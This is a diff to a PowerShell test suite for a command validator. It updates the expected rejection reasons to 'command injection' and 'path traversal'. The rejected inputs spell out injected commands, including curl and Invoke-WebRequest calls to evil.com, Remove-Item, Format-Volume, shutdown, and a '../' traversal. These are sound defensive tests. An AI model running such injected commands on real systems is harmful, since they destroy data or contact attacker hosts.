@@ -189,8 +189,8 @@ Assert-Rejected `
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; Remove-Item file.txt" `
-    -TestName "Contains 'Remove-Item' token" `
-    -ExpectedReason "forbidden token 'Remove-Item'"
+    -TestName "Contains 'Remove-Item' token (caught by injection detection)" `
+    -ExpectedReason "command injection"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1 -Param 'Format-Volume'" `
@@ -199,28 +199,28 @@ Assert-Rejected `
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; Invoke-WebRequest http://evil.com" `
-    -TestName "Contains 'Invoke-WebRequest' token" `
-    -ExpectedReason "forbidden token 'Invoke-WebRequest'"
+    -TestName "Contains 'Invoke-WebRequest' token (caught by injection detection)" `
+    -ExpectedReason "command injection"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; curl http://evil.com" `
-    -TestName "Contains 'curl ' token" `
-    -ExpectedReason "forbidden token 'curl '"
+    -TestName "Contains 'curl ' token (caught by injection detection)" `
+    -ExpectedReason "command injection"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; Start-Process cmd.exe" `
-    -TestName "Contains 'Start-Process' token" `
-    -ExpectedReason "forbidden token 'Start-Process'"
+    -TestName "Contains 'Start-Process' token (caught by injection detection)" `
+    -ExpectedReason "command injection"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; shutdown /s" `
-    -TestName "Contains 'shutdown' token" `
-    -ExpectedReason "forbidden token 'shutdown'"
+    -TestName "Contains 'shutdown' token (caught by injection detection)" `
+    -ExpectedReason "command injection"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/../other/test.ps1" `
-    -TestName "Contains parent directory '..\' token" `
-    -ExpectedReason "forbidden token '..\''"
+    -TestName "Contains parent directory '../' (caught by path traversal detection)" `
+    -ExpectedReason "path traversal"
 
 Write-Host ""
 
@@ -235,7 +235,7 @@ Assert-Rejected `
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; pwsh -NoProfile -File scripts/other.ps1" `
     -TestName "Multiple commands chained" `
-    -ExpectedReason "must start with"
+    -ExpectedReason "command injection"
 
 Assert-Accepted `
     -Command "pwsh -NoProfile -File scripts/test.ps1 -Param 'value with spaces' -Flag" `
